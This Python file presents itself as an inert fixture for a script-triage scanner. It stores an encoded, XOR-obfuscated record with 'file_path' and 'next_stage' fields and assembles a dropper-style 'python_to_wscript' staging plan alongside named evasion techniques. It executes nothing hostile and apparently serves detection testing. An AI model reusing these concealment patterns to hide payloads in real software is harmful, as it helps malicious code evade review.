#!/usr/bin/env python3
if True:
    # Huntress Script Triage -- inert static-analysis fixture (cpython3)
    import base64
    import io
    import os

    MATERIAL_83b32f72 = [129, 248, 136, 166, 194, 167, 213, 176, 198, 169, 202, 175, 221, 240, 200, 251, 152, 225, 145, 172, 201, 174, 207, 187, 200, 151, 227, 155, 254, 144, 236, 149, 229, 203, 168, 158, 255, 199, 254, 156, 253, 197, 253, 206, 227, 134, 242, 147, 247, 135, 242, 220, 243, 145, 240, 188, 207, 188, 217, 171, 223, 177, 196, 140, 163, 194, 182, 215, 147, 254, 159, 237, 138, 229, 151, 199, 232, 210, 145, 172, 196, 176, 209, 161, 254, 155, 247, 158, 248, 132, 231, 209, 176, 136, 177, 211, 178, 138, 178, 129, 172, 194, 165, 204, 173, 221, 176, 209, 178, 143, 235, 130, 221, 179, 212, 189, 220, 172, 193, 160, 195, 191, 209, 190, 214, 162, 219, 171, 244, 155, 239, 176, 212, 185, 218, 231, 137, 224, 129, 233, 138, 213, 166, 209, 190, 218, 180, 221, 170, 214, 172, 213, 165, 250, 138, 250, 155, 235, 130, 248, 197, 183, 210, 187, 201, 187, 218, 185, 197, 182, 194, 172, 201, 164, 195, 162, 208, 182, 233, 141, 232, 155, 233, 140, 250, 159, 237, 208, 190, 209, 184, 204, 173, 206, 189, 200, 174, 204, 163, 223, 183, 212, 160, 193, 177, 194, 171, 207, 144, 241, 149, 247, 154, 251, 151, 170, 210, 179, 199, 169, 208, 163, 223, 236, 209, 165, 203, 190, 209, 178, 237, 136, 239, 142, 250, 137, 245, 129, 241, 152, 234, 137, 250, 141, 210, 189, 201, 150, 248, 151, 255, 139, 242, 130, 191, 205, 168, 220, 172, 205, 169, 200, 180, 209, 182, 215, 163, 208, 143, 251, 131, 230, 136, 215, 191, 220, 168, 201, 185, 202, 163, 199, 235, 153, 252, 136, 237, 159, 239, 157, 248, 140, 226, 139, 212, 177, 197, 164, 199, 168, 196, 232, 134, 233, 128, 244, 149, 231, 146, 245, 156, 250, 148, 251, 152, 199, 162, 198, 169, 202, 175, 203, 246, 133, 245, 144, 228, 151, 235, 217, 228]
    CODEC_83b32f72 = "reversed_integer_list|rolling_xor|92"

    def load_83b32f72():
        return bytes(reversed(MATERIAL_83b32f72))

    def decode_83b32f72(v_a19c):
        v_b27e = bytearray()
        v_e598 = 146
        for value in v_a19c:
            v_b27e.append(value ^ v_e598)
            v_e598 = value
        return bytes(v_b27e)

    def recover_83b32f72():
        v_d41a = ":".join(("north", "south"))
        v_a702 = "decode"
        while v_a702 != "done":
            if v_a702 == "decode":
                v_b27e = decode_83b32f72(load_83b32f72())
                v_a702 = "done"
        v_c304 = v_b27e.decode("ascii", "strict")
        return v_c304

    def inspect_83b32f72():
        return recover_83b32f72()

    def surface_83b32f72():
        dispatch = lambda *items: tuple(items)
        return dispatch("lambda_dispatch", "reversed_fragments", "zipapp_pyz", "cmd_to_python")

    def obfuscation_83b32f72():
        return "stnemgarf_desrever"[::-1]

    def plan_83b32f72():
        fields = dict(item.split("=", 1) for item in inspect_83b32f72().split("|"))
        analysis_surface = surface_83b32f72()
        obfuscation_surface = obfuscation_83b32f72()
        operation_plan = ("python_to_wscript", fields["file_path"], fields["next_stage"])
        return operation_plan + (analysis_surface, obfuscation_surface)

    if os.environ.get("HUNTRESS_INSPECT_ONLY") == "1":
        print(inspect_83b32f72())
